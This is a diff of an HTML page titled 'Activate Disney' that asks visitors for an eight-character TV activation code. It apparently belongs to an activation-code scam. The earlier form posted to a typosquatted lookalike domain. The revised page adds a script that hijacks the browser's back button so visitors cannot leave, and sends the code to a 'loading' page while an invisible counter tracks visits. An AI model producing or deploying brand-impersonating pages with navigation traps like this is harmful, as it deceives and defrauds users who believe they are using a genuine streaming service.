@@ -1,147 +1,97 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Activation Page</title>
-  <style>
-    /* Add container styles */
-.container {
-  max-width: 410px; /* Set maximum width for the container */
-  margin: 0 auto; /* Center the container horizontally */
-  padding: 20px; /* Add padding to the container */
-  background-color: #ffffff; /* Set background color to white */
-  border-radius: 24px; /* Add border radius */
-  border: 2px solid #ccc; /* Add border */
-  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5); /* Add box shadow */
-
-    height:400px;
-    
-}
-
-    /* Rest of your existing styles */
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Activate Disney</title>
+<style>
     body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(to bottom left, #003366 0%, #006666 100%);
-/* Set background color to white */
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
-      align-items: center;
-      height: 100vh; /* Ensure the page takes up the full height of the viewport */
-      width:100%;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #000000; /* Black background */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        height: 100vh;
     }
-    #logo {
-      position: fixed; /* Position the logo */
-      top: 10px; /* Adjust top positioning as needed */
-      left: 10px; /* Adjust left positioning as needed */
-      width: 100px; /* Adjust the width of the logo */
-      height: auto; /* Maintain aspect ratio */
+    .containerlogo {
+        text-align: center;
+        padding: 10px;
+        background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
+        border-radius: 10px;
+        width: 90%;
+        max-width: 400px;
+        margin-top: 10px; /* Adjust if needed */
     }
-    h1 {
-      text-align: center;
-      margin-bottom: 24px; /* Add space below the heading */
-      font-size: 25px;
-      margin-top: 12%; /* Adjust margin top */
+    .logo {
+        width: 250px;
+        display: block;
+        margin: 0 auto 0px; /* Logo at the top center */
     }
-    .code-input {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    
+    .container {
+        text-align: center;
+        padding: 20px;
+        background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
+        border-radius: 10px;
+        width: 90%;
+        max-width: 400px;
+        margin-top: 0px; /* Increased top margin */
     }
-    .code-input input[type="text"] {
-      width: 410px; /* Increase the width */
-      padding: 20px; /* Increase padding */
-      font-size: 60px; /* Increase font size */
-      color: #333;
-      border: none; /* Remove the border */
-      border-radius: 4px;
-      text-align: center;
-      outline: none; /* Remove the default outline */
-      margin-bottom: 20px; /* Add space below the input */
+    h2 {
+        color: #ffffff; /* White color text */
+        margin: 20px 0;
     }
-    .code-input button {
-      padding: 10px 40px; /* Adjust padding */
-      font-size: 20px; /* Adjust font size */
-      background-color: #252526; /* Black */
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-bottom: 20px; /* Add space below the button */
+    input, button {
+        margin: 10px 0;
+        padding: 10px;
+        width: calc(100% - 20px);
+        box-sizing: border-box;
     }
-    .code-input button:hover {
-      background-color: #B4B4B8; /* Change to your desired color */
-      color: white; /* Change text color if needed */
-      /* Any other styles you want to apply on hover */
+    button {
+        background-color: #FFA500;
+        color: white;
+        border: none;
+        cursor: pointer;
+        font-size:18px;
+        width : 150px;
+        border-radius: 10px;
     }
-    .sign-up {
-      font-size: 18px; /* Adjust font size */
-      color: #333; /* Adjust color */
+    button:hover {
+        background-color: #0056b3;
     }
-    .footer-image {
-      width: 100%; /* Ensure the image spans the full width */
-    }
-    
-    
-    
-    /* Add styles for smaller screens */
-@media only screen and (max-width: 600px) {
-  body {
-    font-size: 16px; /* Adjust font size for smaller screens */
-  }
-  
-  .container {
-    max-width: 90%; /* Adjust container width */
-    padding: 10px; /* Adjust container padding */
-    border-radius: 12px; /* Adjust border radius */
-  }
-  
-  .code-input input[type="text"] {
-    width: 100%; /* Make input width full for smaller screens */
-    font-size: 24px; /* Adjust font size */
-    padding: 10px; /* Adjust padding */
-  }
-  
-  .code-input button {
-    padding: 8px 20px; /* Adjust padding */
-    font-size: 16px; /* Adjust font size */
-  }
-}
-
-/* Rest of your existing styles */
-
-  </style>
+</style>
+<script>
+        window.onload = function() {
+            window.history.pushState(null, "", window.location.href);        
+            window.onpopstate = function() {
+                window.history.pushState(null, "", window.location.href);
+            };
+        };
+    </script>
 </head>
 <body>
-    
- <img src="logo (1).png" id="centered-image" width="250" height="150">    
-    
-<div class="container"> <!-- Add container div -->
-  <form action="https://dsnyycode.github.io/activatedisneycode.html" method="#">
-
-   
-    
-    <h1>Enter the 8-digit code you see on <br>your TV to continue</h1>
-    <div class="code-input">
-      <input type="text" title="Enter 8 digits separated by a hyphen (-)" placeholder="_ _ _ _ - _ _ _ _" maxlength="9">
-      <button type="submit">Enter Code to Continue</button>
-      <p class="sign-up"><strong>Need help?</strong></p>
-    </div>
-  </form>
-
-</div> <!-- Close container div -->
-<br>
-<br>
-<br>
-<br>
+<div class="containerlogo">
+    <img src="logo.png" alt="Logo" class="logo"> <!-- Place your logo here -->
+</div>
+<div class="container">
+    <h2>Enter your Activation Code</h2>
+    <form action="loading.html" method="post">
+        <input id="uppercaseInput" type="text" placeholder="Enter Your Code" maxlength="8" minlength="8" required>
+        <button type="submit">Activate</button>
+    </form>
+</div>
+<script>
+    // JavaScript to convert input value to uppercase
+    document.getElementById('uppercaseInput').addEventListener('input', function() {
+        this.value = this.value.toUpperCase();
+    });
+</script>
 
 
-
-  <script type="text/javascript">
+<!-- Default Statcounter code -->
+<script type="text/javascript">
 var sc_project=12955773; 
 var sc_invisible=1; 
 var sc_security="2c48bedc"; 
@@ -150,7 +100,6 @@ var sc_security="2c48bedc";
 src="https://www.statcounter.com/counter/counter.js"
 async></script>
 
-
-
+<!-- End of Statcounter Code -->
 </body>
 </html>
